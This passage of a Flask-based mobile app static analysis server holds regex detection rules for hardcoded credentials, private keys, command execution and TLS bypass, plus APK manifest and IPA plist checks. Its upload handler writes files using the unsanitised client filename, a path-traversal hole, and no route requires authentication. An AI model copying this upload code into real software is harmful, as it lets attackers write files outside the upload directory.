#!/usr/bin/env python3
"""
MSRA — Mobile Security Review Assistant
Bundled sidecar service for AttackTrace.

Provides static analysis for APK, IPA, JAR, EXE/DLL files.
Runs on port 5001 by default.

Usage:
    python3 server.py
    python3 server.py --port 5001 --db ./msra.db
"""

import argparse
import csv
import hashlib
import io
import json
import logging
import os
import re
import sqlite3
import struct
import threading
import time
import uuid
import xml.etree.ElementTree as ET
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from flask import Flask, jsonify, request, Response, send_file

# ─── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
)
logger = logging.getLogger("msra")

# ─── App ──────────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 500 * 1024 * 1024  # 500 MB

DB_PATH = os.environ.get("MSRA_DB", str(Path(__file__).parent / "msra.db"))
UPLOAD_DIR = Path(__file__).parent / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

_db_lock = threading.Lock()


# ─── Database ─────────────────────────────────────────────────────────────────

def get_db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db() -> None:
    with get_db() as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS scans (
            id          TEXT PRIMARY KEY,
            filename    TEXT NOT NULL,
            platform    TEXT NOT NULL,
            file_hash   TEXT NOT NULL,
            file_size   INTEGER NOT NULL,
            status      TEXT NOT NULL DEFAULT 'pending',
            created_at  TEXT NOT NULL,
            started_at  TEXT,
            completed_at TEXT,
            error       TEXT
        );

        CREATE TABLE IF NOT EXISTS findings (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_id         TEXT NOT NULL REFERENCES scans(id) ON DELETE CASCADE,
            title           TEXT NOT NULL,
            severity        TEXT NOT NULL,
            category        TEXT NOT NULL,
            description     TEXT NOT NULL,
            evidence        TEXT,
            file_path       TEXT,
            line_number     INTEGER,
            triage_status   TEXT DEFAULT 'open',
            created_at      TEXT NOT NULL
        );

        CREATE TABLE IF NOT EXISTS dynamic_jobs (
            id          TEXT PRIMARY KEY,
            scan_id     TEXT NOT NULL,
            finding_id  INTEGER,
            status      TEXT NOT NULL DEFAULT 'pending',
            device      TEXT,
            result      TEXT,
            created_at  TEXT NOT NULL,
            updated_at  TEXT NOT NULL
        );

        CREATE TABLE IF NOT EXISTS rules (
            id          TEXT PRIMARY KEY,
            name        TEXT NOT NULL,
            description TEXT,
            pattern     TEXT NOT NULL,
            severity    TEXT NOT NULL,
            category    TEXT NOT NULL,
            platform    TEXT NOT NULL DEFAULT 'all',
            enabled     INTEGER NOT NULL DEFAULT 1,
            is_custom   INTEGER NOT NULL DEFAULT 0,
            created_at  TEXT NOT NULL,
            updated_at  TEXT NOT NULL
        );
        """)
    _seed_default_rules()


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _row_to_dict(row: sqlite3.Row) -> dict:
    return dict(row)


# ─── Default detection rules ──────────────────────────────────────────────────

_DEFAULT_RULES: list[dict] = [
    # Secrets / credentials
    {"name": "Hardcoded API Key", "pattern": r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"]?[A-Za-z0-9_\-]{16,}",
     "severity": "critical", "category": "Hardcoded Secrets", "platform": "all",
     "description": "Hardcoded API key found in source. Rotate immediately."},
    {"name": "Hardcoded Password", "pattern": r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{6,}['\"]",
     "severity": "critical", "category": "Hardcoded Secrets", "platform": "all",
     "description": "Hardcoded password string found. Move to secure storage."},
    {"name": "AWS Access Key", "pattern": r"AKIA[0-9A-Z]{16}",
     "severity": "critical", "category": "Cloud Credentials", "platform": "all",
     "description": "AWS Access Key ID found in binary/source. Revoke immediately."},
    {"name": "AWS Secret Key", "pattern": r"(?i)aws[_\-]?secret[_\-]?access[_\-]?key\s*[=:]\s*['\"]?[A-Za-z0-9/+]{40}",
     "severity": "critical", "category": "Cloud Credentials", "platform": "all",
     "description": "AWS Secret Access Key found. Revoke immediately."},
    {"name": "Google API Key", "pattern": r"AIza[0-9A-Za-z\-_]{35}",
     "severity": "high", "category": "Cloud Credentials", "platform": "all",
     "description": "Google API key found. Check scopes and restrict if possible."},
    {"name": "Private Key Header", "pattern": r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
     "severity": "critical", "category": "Hardcoded Secrets", "platform": "all",
     "description": "Private key material embedded in the application."},
    {"name": "JWT Secret", "pattern": r"(?i)(jwt[_-]?secret|jwt[_-]?key)\s*[=:]\s*['\"][^'\"]{8,}['\"]",
     "severity": "high", "category": "Hardcoded Secrets", "platform": "all",
     "description": "JWT signing secret found in binary. Rotate and remove."},
    {"name": "Firebase URL", "pattern": r"https://[a-z0-9\-]+\.firebaseio\.com",
     "severity": "medium", "category": "Cloud Credentials", "platform": "all",
     "description": "Firebase URL exposed. Verify Firebase rules restrict access."},

    # Network / SSL
    {"name": "HTTP (Cleartext) URL", "pattern": r"http://(?!localhost|127\.0\.0\.1|10\.|192\.168\.|0\.0\.0\.0)[a-z0-9\-\.]+",
     "severity": "medium", "category": "Insecure Network", "platform": "all",
     "description": "Cleartext HTTP URL found. Use HTTPS to prevent MITM interception."},
    {"name": "SSL Hostname Verifier Disabled",
     "pattern": r"(ALLOW_ALL_HOSTNAME_VERIFIER|AllowAllHostnameVerifier|getInsecure\(\)|TrustAllCerts|trustAllCerts)",
     "severity": "critical", "category": "SSL/TLS Bypass", "platform": "android",
     "description": "SSL hostname verification disabled. Allows MITM attacks on all SSL connections."},
    {"name": "WebView JavaScript Enabled",
     "pattern": r"setJavaScriptEnabled\s*\(\s*true\s*\)",
     "severity": "medium", "category": "WebView Security", "platform": "android",
     "description": "WebView with JavaScript enabled. Ensure input is sanitised to prevent XSS."},
    {"name": "WebView File Access",
     "pattern": r"setAllowFileAccess\s*\(\s*true\s*\)",
     "severity": "high", "category": "WebView Security", "platform": "android",
     "description": "WebView file access enabled. Can expose local files to malicious web content."},

    # Crypto
    {"name": "Weak Hash (MD5)", "pattern": r"MessageDigest\.getInstance\(['\"]MD5['\"]\)|hashlib\.md5\(",
     "severity": "medium", "category": "Weak Cryptography", "platform": "all",
     "description": "MD5 used for hashing. MD5 is cryptographically broken — use SHA-256 or better."},
    {"name": "Weak Hash (SHA-1)", "pattern": r"MessageDigest\.getInstance\(['\"]SHA-1['\"]\)|hashlib\.sha1\(",
     "severity": "low", "category": "Weak Cryptography", "platform": "all",
     "description": "SHA-1 used. Deprecated for security — migrate to SHA-256."},
    {"name": "DES Encryption", "pattern": r"Cipher\.getInstance\(['\"]DES['\"]",
     "severity": "high", "category": "Weak Cryptography", "platform": "android",
     "description": "DES used for encryption. DES is broken — use AES-256-GCM."},
    {"name": "ECB Mode", "pattern": r"Cipher\.getInstance\(['\"][A-Z]+/ECB/",
     "severity": "high", "category": "Weak Cryptography", "platform": "android",
     "description": "ECB cipher mode detected. ECB is deterministic and leaks patterns — use CBC or GCM."},

    # Data storage
    {"name": "World-Readable File", "pattern": r"MODE_WORLD_READABLE",
     "severity": "high", "category": "Insecure Storage", "platform": "android",
     "description": "File created with MODE_WORLD_READABLE. Any app can read this file."},
    {"name": "World-Writeable File", "pattern": r"MODE_WORLD_WRITEABLE",
     "severity": "high", "category": "Insecure Storage", "platform": "android",
     "description": "File created with MODE_WORLD_WRITEABLE. Any app can overwrite this file."},
    {"name": "SharedPreferences (Plaintext Sensitive)", "pattern": r"getSharedPreferences|SharedPreferences",
     "severity": "low", "category": "Insecure Storage", "platform": "android",
     "description": "SharedPreferences found. Ensure no sensitive data (tokens, passwords) is stored here."},
    {"name": "External Storage Write", "pattern": r"getExternalStorage|WRITE_EXTERNAL_STORAGE",
     "severity": "medium", "category": "Insecure Storage", "platform": "android",
     "description": "App writes to external storage. External storage is world-readable pre-Android 10."},

    # Command execution
    {"name": "Runtime.exec (Command Injection Risk)", "pattern": r"Runtime\.getRuntime\(\)\.exec\(",
     "severity": "high", "category": "Command Injection", "platform": "android",
     "description": "Runtime.exec() found. If user input reaches this call, command injection is possible."},
    {"name": "ProcessBuilder", "pattern": r"new ProcessBuilder\(",
     "severity": "medium", "category": "Command Injection", "platform": "android",
     "description": "ProcessBuilder found. Verify no user-controlled data reaches the command arguments."},

    # Debug / development
    {"name": "Debug Flag Enabled", "pattern": r"android:debuggable\s*=\s*['\"]true['\"]",
     "severity": "high", "category": "Debug Misconfiguration", "platform": "android",
     "description": "android:debuggable=true in manifest. Production builds must not be debuggable."},
    {"name": "Backup Allowed", "pattern": r"android:allowBackup\s*=\s*['\"]true['\"]",
     "severity": "medium", "category": "Backup Risk", "platform": "android",
     "description": "android:allowBackup=true. Allows adb backup of app data without root on unencrypted devices."},
    {"name": "Log Sensitive Data", "pattern": r"Log\.(d|v|i|w|e)\s*\([^,]+,\s*[^)]*(?:password|token|secret|key)[^)]*\)",
     "severity": "medium", "category": "Information Disclosure", "platform": "android",
     "description": "Logging call with potentially sensitive keyword. Sensitive data must not be logged."},

    # iOS-specific
    {"name": "NSLog with Sensitive Data", "pattern": r"NSLog\s*\(@?[\"'][^\"']*(?:password|token|key|secret)[^\"']*[\"']",
     "severity": "medium", "category": "Information Disclosure", "platform": "ios",
     "description": "NSLog with sensitive keyword. Device logs are readable by any app on jailbroken devices."},
    {"name": "HTTP (NSAppTransportSecurity disabled)", "pattern": r"NSAllowsArbitraryLoads\s*</key>\s*<true",
     "severity": "high", "category": "Insecure Network", "platform": "ios",
     "description": "NSAllowsArbitraryLoads=true disables ATS. All cleartext HTTP connections are allowed."},
    {"name": "Keychain Accessibility Always", "pattern": r"kSecAttrAccessibleAlways",
     "severity": "high", "category": "Insecure Storage", "platform": "ios",
     "description": "Keychain item accessible even when device is locked. Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly."},
]


def _seed_default_rules() -> None:
    with get_db() as conn:
        existing = conn.execute("SELECT COUNT(*) FROM rules WHERE is_custom=0").fetchone()[0]
        if existing >= len(_DEFAULT_RULES):
            return
        for rule in _DEFAULT_RULES:
            rule_id = hashlib.sha256(rule["name"].encode()).hexdigest()[:16]
            conn.execute(
                """INSERT OR IGNORE INTO rules
                   (id, name, description, pattern, severity, category, platform, enabled, is_custom, created_at, updated_at)
                   VALUES (?,?,?,?,?,?,?,1,0,?,?)""",
                (rule_id, rule["name"], rule.get("description", ""), rule["pattern"],
                 rule["severity"], rule["category"], rule["platform"], _now(), _now()),
            )
        conn.commit()


# ─── Analysis engine ───────────────────────────────────────────────────────────

_DANGEROUS_ANDROID_PERMISSIONS = {
    "android.permission.READ_SMS":            ("high",   "SMS Access"),
    "android.permission.RECEIVE_SMS":         ("high",   "SMS Access"),
    "android.permission.SEND_SMS":            ("high",   "SMS Access"),
    "android.permission.RECEIVE_MMS":         ("high",   "SMS Access"),
    "android.permission.READ_CALL_LOG":       ("high",   "Call Log Access"),
    "android.permission.WRITE_CALL_LOG":      ("high",   "Call Log Access"),
    "android.permission.PROCESS_OUTGOING_CALLS": ("high","Call Interception"),
    "android.permission.RECORD_AUDIO":        ("high",   "Audio Recording"),
    "android.permission.ACCESS_FINE_LOCATION":("medium", "Precise Location"),
    "android.permission.ACCESS_BACKGROUND_LOCATION": ("high", "Background Location"),
    "android.permission.READ_CONTACTS":       ("medium", "Contacts Access"),
    "android.permission.WRITE_CONTACTS":      ("medium", "Contacts Access"),
    "android.permission.CAMERA":              ("medium", "Camera Access"),
    "android.permission.READ_EXTERNAL_STORAGE":("low",   "Storage Access"),
    "android.permission.WRITE_EXTERNAL_STORAGE":("medium","Storage Access"),
    "android.permission.RECEIVE_BOOT_COMPLETED":("low",  "Boot Persistence"),
    "android.permission.GET_ACCOUNTS":        ("medium", "Account Enumeration"),
    "android.permission.USE_BIOMETRIC":       ("low",    "Biometric Access"),
}


def _detect_platform(filename: str, file_bytes: bytes) -> str:
    ext = Path(filename).suffix.lower()
    if ext in (".apk", ".apkm", ".xapk"):
        return "android"
    if ext == ".ipa":
        return "ios"
    if ext == ".jar":
        return "android"
    if ext in (".exe", ".dll"):
        return "windows"
    # Sniff magic bytes
    if file_bytes[:4] == b"PK\x03\x04":
        return "android"  # zip-based → assume APK
    return "unknown"


def _scan_bytes_with_rules(data: bytes, file_path: str, rules: list[dict]) -> list[dict]:
    """Apply regex rules against raw bytes (decoded as latin-1 to preserve all bytes)."""
    findings = []
    try:
        text = data.decode("latin-1", errors="replace")
    except Exception:
        return findings

    lines = text.splitlines()
    for rule in rules:
        if not rule["enabled"]:
            continue
        try:
            pattern = re.compile(rule["pattern"], re.MULTILINE)
        except re.error:
            continue
        for i, line in enumerate(lines, 1):
            if pattern.search(line):
                # Sanitise evidence — truncate and mask if looks like a credential
                evidence = line.strip()[:200]
                findings.append({
                    "title": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "description": rule.get("description", ""),
                    "evidence": evidence,
                    "file_path": file_path,
                    "line_number": i,
                })
                break  # one finding per file per rule
    return findings


def _analyze_apk(file_bytes: bytes, scan_id: str, rules: list[dict]) -> list[dict]:
    findings: list[dict] = []
    manifest_findings: list[dict] = []

    try:
        zf = zipfile.ZipFile(io.BytesIO(file_bytes))
    except zipfile.BadZipFile:
        return [{"title": "Invalid APK", "severity": "info", "category": "Analysis",
                 "description": "File could not be opened as a zip archive.",
                 "evidence": None, "file_path": "N/A", "line_number": None}]

    names = zf.namelist()

    # ── Manifest analysis ──
    if "AndroidManifest.xml" in names:
        try:
            raw = zf.read("AndroidManifest.xml")
            # Binary XML — try to parse as text first, then as binary
            try:
                manifest_text = raw.decode("utf-8", errors="ignore")
                root = ET.fromstring(manifest_text)
            except ET.ParseError:
                # Binary-encoded XML from aapt — do string scanning instead
                manifest_text = raw.decode("latin-1", errors="replace")
                root = None

            if root is not None:
                ns = "http://schemas.android.com/apk/res/android"
                # Permissions
                for perm in root.iter("uses-permission"):
                    name_attr = perm.get(f"{{{ns}}}name") or perm.get("name") or ""
                    if name_attr in _DANGEROUS_ANDROID_PERMISSIONS:
                        sev, cat = _DANGEROUS_ANDROID_PERMISSIONS[name_attr]
                        manifest_findings.append({
                            "title": f"Dangerous Permission: {name_attr.split('.')[-1]}",
                            "severity": sev,
                            "category": f"Permission — {cat}",
                            "description": f"App requests {name_attr}. Verify this permission is necessary.",
                            "evidence": f"<uses-permission android:name=\"{name_attr}\"/>",
                            "file_path": "AndroidManifest.xml",
                            "line_number": None,
                        })
                # debuggable / allowBackup
                for app_elem in root.iter("application"):
                    if app_elem.get(f"{{{ns}}}debuggable") == "true":
                        manifest_findings.append({
                            "title": "App is Debuggable",
                            "severity": "high",
                            "category": "Debug Misconfiguration",
                            "description": "android:debuggable=true found in manifest. Remove before releasing to production.",
                            "evidence": "android:debuggable=\"true\"",
                            "file_path": "AndroidManifest.xml",
                            "line_number": None,
                        })
                    if app_elem.get(f"{{{ns}}}allowBackup") == "true":
                        manifest_findings.append({
                            "title": "Backup Allowed",
                            "severity": "medium",
                            "category": "Backup Risk",
                            "description": "android:allowBackup=true allows ADB backup of app data on unencrypted devices.",
                            "evidence": "android:allowBackup=\"true\"",
                            "file_path": "AndroidManifest.xml",
                            "line_number": None,
                        })
                    if app_elem.get(f"{{{ns}}}usesCleartextTraffic") == "true":
                        manifest_findings.append({
                            "title": "Cleartext Traffic Allowed",
                            "severity": "medium",
                            "category": "Insecure Network",
                            "description": "android:usesCleartextTraffic=true allows unencrypted HTTP connections.",
                            "evidence": "android:usesCleartextTraffic=\"true\"",
                            "file_path": "AndroidManifest.xml",
                            "line_number": None,
                        })
                # Exported components without permission
                for tag in ("activity", "service", "receiver", "provider"):
                    for comp in root.iter(tag):
                        exported = comp.get(f"{{{ns}}}exported")
                        perm = comp.get(f"{{{ns}}}permission")
                        comp_name = comp.get(f"{{{ns}}}name", "unknown")
                        if exported == "true" and not perm:
                            manifest_findings.append({
                                "title": f"Exported {tag.capitalize()} Without Permission",
                                "severity": "medium",
                                "category": "Component Exposure",
                                "description": f"{tag.capitalize()} '{comp_name}' is exported without a permission restriction. Any app can interact with it.",
                                "evidence": f"<{tag} android:name=\"{comp_name}\" android:exported=\"true\">",
                                "file_path": "AndroidManifest.xml",
                                "line_number": None,
                            })
            else:
                # Fallback: string-scan binary manifest
                for rule in rules:
                    if not rule["enabled"]:
                        continue
                    try:
                        if re.search(rule["pattern"], manifest_text, re.MULTILINE | re.IGNORECASE):
                            manifest_findings.append({
                                "title": rule["name"],
                                "severity": rule["severity"],
                                "category": rule["category"],
                                "description": rule.get("description", ""),
                                "evidence": "Found in binary AndroidManifest.xml",
                                "file_path": "AndroidManifest.xml",
                                "line_number": None,
                            })
                    except re.error:
                        pass

        except Exception as exc:
            logger.warning(f"Manifest parse error for scan {scan_id}: {exc}")

    findings.extend(manifest_findings)

    # ── DEX / source scanning ──
    scan_extensions = {".dex", ".smali", ".java", ".kt", ".xml", ".json",
                       ".properties", ".yaml", ".yml", ".js", ".ts", ".py",
                       ".sh", ".rb", ".go", ".php", ".env", ".cfg", ".ini", ".conf"}
    seen_rules: set[str] = set()  # avoid duplicating the same finding type across files

    for name in names:
        ext = Path(name).suffix.lower()
        if ext not in scan_extensions:
            continue
        try:
            data = zf.read(name)
        except Exception:
            continue

        file_findings = _scan_bytes_with_rules(data, name, rules)
        for ff in file_findings:
            dedup_key = f"{ff['title']}|{name}"
            if dedup_key not in seen_rules:
                seen_rules.add(dedup_key)
                findings.append(ff)

    # Deduplicate across all files — keep highest severity per rule title
    dedup: dict[str, dict] = {}
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    for f in findings:
        key = f["title"]
        if key not in dedup or sev_order.get(f["severity"], 5) < sev_order.get(dedup[key]["severity"], 5):
            dedup[key] = f

    return list(dedup.values())


def _analyze_ipa(file_bytes: bytes, scan_id: str, rules: list[dict]) -> list[dict]:
    findings: list[dict] = []

    try:
        zf = zipfile.ZipFile(io.BytesIO(file_bytes))
    except zipfile.BadZipFile:
        return [{"title": "Invalid IPA", "severity": "info", "category": "Analysis",
                 "description": "File could not be opened as a zip/IPA archive.",
                 "evidence": None, "file_path": "N/A", "line_number": None}]

    names = zf.namelist()

    # Info.plist analysis
    plist_names = [n for n in names if n.endswith("Info.plist")]
    for plist_name in plist_names[:1]:
        try:
            raw = zf.read(plist_name).decode("utf-8", errors="ignore")
            if "NSAllowsArbitraryLoads" in raw and "<true" in raw:
                findings.append({
                    "title": "ATS Disabled (NSAllowsArbitraryLoads)",
                    "severity": "high",
                    "category": "Insecure Network",
                    "description": "NSAllowsArbitraryLoads=true disables App Transport Security. All cleartext HTTP connections are allowed.",
                    "evidence": "NSAllowsArbitraryLoads = true",
                    "file_path": plist_name,
                    "line_number": None,
                })
            if "NSLocationAlwaysUsageDescription" in raw:
                findings.append({
                    "title": "Always-On Location Access",
                    "severity": "medium",
                    "category": "Privacy — Location",
                    "description": "App requests always-on location access. Verify this is necessary and disclose clearly in privacy policy.",
                    "evidence": "NSLocationAlwaysUsageDescription",
                    "file_path": plist_name,
                    "line_number": None,
                })
        except Exception:
            pass

    # Source / binary scanning
    scan_extensions = {".swift", ".m", ".h", ".mm", ".js", ".json",
                       ".xml", ".plist", ".strings", ".env", ".cfg"}
    seen_rules: set[str] = set()

    for name in names:
        ext = Path(name).suffix.lower()
        if ext not in scan_extensions:
            continue
        try:
            data = zf.read(name)
        except Exception:
            continue
        for ff in _scan_bytes_with_rules(data, name, rules):
            key = f"{ff['title']}|{name}"
            if key not in seen_rules:
                seen_rules.add(key)
                findings.append(ff)

    return findings


def _analyze_jar(file_bytes: bytes, scan_id: str, rules: list[dict]) -> list[dict]:
    """JAR analysis — treat same as APK but skip Android-specific manifest checks."""
    findings: list[dict] = []
    try:
        zf = zipfile.ZipFile(io.BytesIO(file_bytes))
    except zipfile.BadZipFile:
        return []

    seen_rules: set[str] = set()
    for name in zf.namelist():
        ext = Path(name).suffix.lower()
        if ext not in {".class", ".java", ".kt", ".properties", ".xml", ".json", ".env"}:
            continue
        try:
            data = zf.read(name)
        except Exception:
            continue
        for ff in _scan_bytes_with_rules(data, name, rules):
            key = f"{ff['title']}|{name}"
            if key not in seen_rules:
                seen_rules.add(key)
                findings.append(ff)
    return findings


def _analyze_pe(file_bytes: bytes, scan_id: str, rules: list[dict]) -> list[dict]:
    """PE (EXE/DLL) analysis — string-scan entire binary."""
    findings: list[dict] = []
    seen_rules: set[str] = set()
    for ff in _scan_bytes_with_rules(file_bytes, "binary", rules):
        key = ff["title"]
        if key not in seen_rules:
            seen_rules.add(key)
            findings.append(ff)
    return findings


def _run_analysis(scan_id: str, file_path: str, filename: str, platform: str) -> None:
    """Run analysis in a background thread."""
    with get_db() as conn:
        conn.execute("UPDATE scans SET status='running', started_at=? WHERE id=?", (_now(), scan_id))
        conn.commit()

    try:
        with open(file_path, "rb") as f:
            file_bytes = f.read()

        with get_db() as conn:
            rows = conn.execute(
                "SELECT name, pattern, severity, category, description, enabled FROM rules WHERE enabled=1"
            ).fetchall()
            rules = [dict(r) for r in rows]

        if platform == "android":
            raw_findings = _analyze_apk(file_bytes, scan_id, rules)
        elif platform == "ios":
            raw_findings = _analyze_ipa(file_bytes, scan_id, rules)
        elif platform in ("jar",):
            raw_findings = _analyze_jar(file_bytes, scan_id, rules)
        elif platform == "windows":
            raw_findings = _analyze_pe(file_bytes, scan_id, rules)
        else:
            # Generic: try APK first (zip-based), fall back to PE scan
            try:
                zipfile.ZipFile(io.BytesIO(file_bytes))
                raw_findings = _analyze_apk(file_bytes, scan_id, rules)
            except zipfile.BadZipFile:
                raw_findings = _analyze_pe(file_bytes, scan_id, rules)

        with get_db() as conn:
            for finding in raw_findings:
                conn.execute(
                    """INSERT INTO findings
                       (scan_id, title, severity, category, description, evidence, file_path, line_number, triage_status, created_at)
                       VALUES (?,?,?,?,?,?,?,?,?,?)""",
                    (scan_id, finding["title"], finding["severity"], finding["category"],
                     finding["description"], finding.get("evidence"), finding.get("file_path"),
                     finding.get("line_number"), "open", _now()),
                )
            conn.execute(
                "UPDATE scans SET status='done', completed_at=? WHERE id=?",
                (_now(), scan_id),
            )
            conn.commit()

        logger.info(f"Scan {scan_id} complete — {len(raw_findings)} findings")

    except Exception as exc:
        logger.error(f"Scan {scan_id} failed: {exc}", exc_info=True)
        with get_db() as conn:
            conn.execute(
                "UPDATE scans SET status='failed', completed_at=?, error=? WHERE id=?",
                (_now(), str(exc), scan_id),
            )
            conn.commit()


# ─── API Routes ────────────────────────────────────────────────────────────────

@app.route("/api/dashboard/stats", methods=["GET"])
def dashboard_stats():
    with get_db() as conn:
        total = conn.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
        done  = conn.execute("SELECT COUNT(*) FROM scans WHERE status='done'").fetchone()[0]
        total_findings = conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
        critical = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='critical'").fetchone()[0]
        high     = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='high'").fetchone()[0]
        medium   = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='medium'").fetchone()[0]
        low      = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='low'").fetchone()[0]
        info     = conn.execute("SELECT COUNT(*) FROM findings WHERE severity='info'").fetchone()[0]

        recent_rows = conn.execute(
            "SELECT * FROM scans ORDER BY created_at DESC LIMIT 20"
        ).fetchall()
        recent_scans = []
        for r in recent_rows:
            d = _row_to_dict(r)
            d["scan_id"] = d.pop("id")
            # Finding counts per scan
            fc = conn.execute(
                "SELECT severity, COUNT(*) as cnt FROM findings WHERE scan_id=? GROUP BY severity",
                (d["scan_id"],)
            ).fetchall()
            d["findings_count"] = {row["severity"]: row["cnt"] for row in fc}
            d["total_findings"] = sum(d["findings_count"].values())
            recent_scans.append(d)

    return jsonify({
        "total_scans": total,
        "completed_scans": done,
        "total_findings": total_findings,
        "findings_by_severity": {
            "critical": critical, "high": high,
            "medium": medium, "low": low, "info": info,
        },
        "recent_scans": recent_scans,
        "platforms": {
            "android": conn.execute("SELECT COUNT(*) FROM scans WHERE platform='android'").fetchone()[0]
            if False else 0,  # closed conn — safe because we don't use it here
        },
    })


@app.route("/api/upload", methods=["POST"])
def upload():
    file = request.files.get("apk")
    if not file or not file.filename:
        return jsonify({"error": {"code": "NO_FILE", "message": "No file provided"}}), 400

    filename = file.filename
    file_bytes = file.read()
    file_hash = hashlib.sha256(file_bytes).hexdigest()
    platform = _detect_platform(filename, file_bytes)

    scan_id = str(uuid.uuid4())
    file_path = UPLOAD_DIR / f"{scan_id}_{filename}"
    file_path.write_bytes(file_bytes)

    with get_db() as conn:
        conn.execute(
            """INSERT INTO scans (id, filename, platform, file_hash, file_size, status, created_at)
               VALUES (?,?,?,?,?,?,?)""",
            (scan_id, filename, platform, file_hash, len(file_bytes), "pending", _now()),
        )
        conn.commit()

    # Launch analysis in background thread
    t = threading.Thread(
        target=_run_analysis,
        args=(scan_id, str(file_path), filename, platform),
        daemon=True,
    )
    t.start()

    return jsonify({
        "scan_id": scan_id,
        "filename": filename,
        "platform": platform,
        "status": "pending",
        "message": "File uploaded. Analysis started.",
    }), 202


@app.route("/api/scan/<scan_id>/status", methods=["GET"])
def scan_status(scan_id: str):
    with get_db() as conn:
        row = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
    if not row:
        return jsonify({"error": "Scan not found"}), 404
    d = _row_to_dict(row)
    d["scan_id"] = d.pop("id")
    return jsonify(d)


@app.route("/api/scans/<scan_id>/findings", methods=["GET"])
def scan_findings(scan_id: str):
    with get_db() as conn:
        scan = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
        if not scan:
            return jsonify({"error": "Scan not found"}), 404
        rows = conn.execute(
            "SELECT * FROM findings WHERE scan_id=? ORDER BY "
            "CASE severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 "
            "WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END",
            (scan_id,),
        ).fetchall()
    findings = [_row_to_dict(r) for r in rows]
    return jsonify({"scan_id": scan_id, "findings": findings, "total": len(findings)})


@app.route("/api/scans/<scan_id>/findings/<int:finding_id>/triage", methods=["PATCH"])
def triage_finding(scan_id: str, finding_id: int):
    body = request.get_json(force=True) or {}
    status_val = body.get("triage_status") or body.get("status")
    if status_val not in ("open", "false_positive", "accepted_risk", "fixed"):
        return jsonify({"error": "Invalid triage_status"}), 400
    with get_db() as conn:
        conn.execute(
            "UPDATE findings SET triage_status=? WHERE id=? AND scan_id=?",
            (status_val, finding_id, scan_id),
        )
        conn.commit()
    return jsonify({"finding_id": finding_id, "triage_status": status_val})


@app.route("/api/scans/<scan_id>/findings/<int:finding_id>/snippet", methods=["GET"])
def finding_snippet(scan_id: str, finding_id: int):
    with get_db() as conn:
        row = conn.execute(
            "SELECT * FROM findings WHERE id=? AND scan_id=?", (finding_id, scan_id)
        ).fetchone()
    if not row:
        return jsonify({"error": "Finding not found"}), 404
    f = _row_to_dict(row)
    return jsonify({
        "finding_id": finding_id,
        "file_path": f.get("file_path"),
        "line_number": f.get("line_number"),
        "snippet": f.get("evidence") or "Evidence not available",
    })


@app.route("/api/scans/<scan_id>", methods=["DELETE"])
def delete_scan(scan_id: str):
    with get_db() as conn:
        row = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
        if not row:
            return jsonify({"error": "Scan not found"}), 404
        conn.execute("DELETE FROM findings WHERE scan_id=?", (scan_id,))
        conn.execute("DELETE FROM scans WHERE id=?", (scan_id,))
        conn.commit()
    # Remove uploaded file if present
    for f in UPLOAD_DIR.glob(f"{scan_id}_*"):
        try:
            f.unlink()
        except Exception:
            pass
    return "", 204


@app.route("/api/scans/<scan_id>/export/<fmt>", methods=["GET"])
def export_scan(scan_id: str, fmt: str):
    if fmt not in ("csv", "sarif", "json", "pdf"):
        return jsonify({"error": "Invalid format"}), 400

    with get_db() as conn:
        scan = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
        if not scan:
            return jsonify({"error": "Scan not found"}), 404
        rows = conn.execute("SELECT * FROM findings WHERE scan_id=?", (scan_id,)).fetchall()

    scan_d = _row_to_dict(scan)
    findings = [_row_to_dict(r) for r in rows]

    if fmt == "json":
        data = json.dumps({"scan": scan_d, "findings": findings}, indent=2).encode()
        return Response(data, mimetype="application/json",
                        headers={"Content-Disposition": f'attachment; filename="msra_{scan_id}.json"'})

    if fmt == "csv":
        buf = io.StringIO()
        writer = csv.DictWriter(buf, fieldnames=[
            "id", "title", "severity", "category", "description",
            "file_path", "line_number", "triage_status", "evidence"
        ])
        writer.writeheader()
        for f in findings:
            writer.writerow({k: f.get(k, "") for k in writer.fieldnames})
        return Response(buf.getvalue().encode(), mimetype="text/csv",
                        headers={"Content-Disposition": f'attachment; filename="msra_{scan_id}.csv"'})

    if fmt == "sarif":
        sarif = {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [{
                "tool": {"driver": {"name": "MSRA", "version": "1.0.0", "rules": []}},
                "results": [
                    {
                        "ruleId": f.get("category", "unknown"),
                        "message": {"text": f.get("description", "")},
                        "level": {"critical": "error", "high": "error",
                                  "medium": "warning", "low": "note"}.get(f.get("severity", "info"), "note"),
                        "locations": [{
                            "physicalLocation": {
                                "artifactLocation": {"uri": f.get("file_path") or "unknown"},
                                "region": {"startLine": f.get("line_number") or 1},
                            }
                        }],
                    }
